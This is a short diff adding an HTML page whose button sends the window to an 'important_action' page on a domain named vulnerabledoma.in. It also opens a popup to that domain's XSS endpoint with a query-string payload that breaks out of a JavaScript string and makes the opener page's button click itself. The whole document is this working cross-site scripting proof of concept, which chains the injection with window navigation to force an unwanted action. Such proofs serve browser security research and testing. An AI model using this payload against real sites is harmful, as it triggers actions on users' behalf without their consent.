@@ -1,0 +1,8 @@
+
+<script>
+function go(){
+	location="http://vulnerabledoma.in/important_action.html";
+	window.open("http://vulnerabledoma.in/xss_js?q=%22%3B~{valueOf:opener.button.click}//");
+}
+</script>
+<button onclick="go()">go</button>
